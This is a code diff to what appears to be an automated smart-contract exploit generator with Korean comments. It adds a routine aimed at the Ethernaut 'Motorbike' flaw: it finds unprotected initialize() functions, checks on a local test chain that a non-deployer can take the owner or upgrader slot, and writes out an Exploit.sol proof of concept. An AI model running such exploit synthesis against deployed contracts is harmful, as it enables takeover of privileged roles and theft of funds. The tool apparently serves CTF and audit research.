@@ -2557,6 +2557,80 @@ def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_s
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_uninitialized(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Motorbike 류(및 미보호 initializer 일반화): 구현/컨트랙트가 초기화되지
+    않은 채 배포되어, 누구나 initialize() 를 호출해 특권 주소(upgrader/owner/admin)를 선점한다.
+    배포자와 다른 계정에서 initialize() 를 호출해 특권 변수가 공격자로 바뀌는지로 증명한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    entry = None; priv = None
+    for fn in _functions(tb):
+        if not fn["external"] or len(fn["args"]) > 1:
+            continue
+        if not re.search(r"initial", fn["name"], re.I):
+            continue
+        mm = re.search(r"(\w+)\s*=\s*msg\.sender", fn["body"])
+        if mm:
+            entry = fn["name"]; priv = mm.group(1); break
+    if not entry or not priv:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    if not _has_getter(abi, priv):
+        return None
+    ac = None
+    for e in abi:
+        if e.get("type")=="function" and e.get("name")==entry:
+            ac = [i["type"] for i in e.get("inputs",[])]
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":deployer,"gas":6_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    p0 = tc.functions[priv]().call()
+    try:
+        args = [ (Web3.to_checksum_address(acct) if t=="address" else _default_for_type(t)) for t in (ac or []) ]
+        getattr(tc.functions, entry)(*args).transact({"from":acct,"gas":1_000_000})
+    except Exception:
+        return None
+    p1 = tc.functions[priv]().call()
+    if p1 == p0 or int(p1, 16) != int(acct, 16):
+        return None
+    poc = (HEADER +
+        "// Strategy: uninitialized initializer (Ethernaut Motorbike). The contract is deployed\n"
+        f"// without being initialized, so anyone can call {entry}() to seize the privileged\n"
+        f"// slot `{priv}` (then e.g. upgradeToAndCall to arbitrary code).\n"
+        f"interface IT {{ function {entry}({','.join(ac or [])}) external; }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        f"        IT(t).{entry}({', '.join('address(this)' if x=='address' else '0' for x in (ac or []))});\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (uninitialized)","strategy":"uninitialized","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked via uninitialized initializer",
+            "strategy":f"uninitialized:{entry}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"초기화되지 않은 컨트랙트의 initialize() 를 호출해 특권 슬롯(upgrader/owner 류)을 선점했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_stake_accounting(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Stake 류: 외부 토큰(WETH) 이전이 실패/무동작이어도 사용자 지분을 올려주는
     회계 버그. 가짜 WETH(allowance=max, transferFrom=true no-op)를 물려 stake 를 부풀린 뒤
@@ -4369,6 +4443,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0y) Motorbike (초기화되지 않은 initializer → upgrader 선점)
+    try:
+        r = _synth_uninitialized(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0x) Stake (가짜 WETH 회계 버그 → 실 ETH 인출)
     try:
         r = _synth_stake_accounting(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -4472,7 +4553,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
                _synth_higher_order, _synth_switch, _synth_array_underflow,
                _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
-               _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting):
+               _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting,
+               _synth_uninitialized):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
